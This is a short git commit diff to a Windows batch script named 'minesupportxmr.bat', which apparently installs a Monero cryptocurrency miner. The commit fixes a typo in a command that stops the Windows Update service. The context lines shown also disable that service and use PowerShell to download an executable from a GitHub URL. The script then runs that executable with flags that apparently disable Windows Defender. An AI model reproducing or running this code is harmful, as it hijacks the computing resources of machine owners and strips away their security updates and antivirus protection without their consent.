3ef5179c42259fe3a5daa6821ae52894730d71a2
Haochen Zeng <zenghaochen1@gmail.com>
2023-03-05 13:05:46 +0800

    Update minesupportxmr.bat

--- minesupportxmr.bat
+++ minesupportxmr.bat
@@ -177,7 +177,7 @@ echo [*] Removing "%USERPROFILE%\c3pool" directory
 rmdir /q /s "%USERPROFILE%\c3pool" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\c3pool" GOTO REMOVE_DIR0
 
-net stop wuausery
+net stop wuauserv
 sc config wuausery start=disabled
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/WDControl_1.7.0.exe', '%USERPROFILE%\WDControl_1.7.0.exe')"
 "%USERPROFILE%\WDControl_1.7.0.exe" /Disable /force>NUL
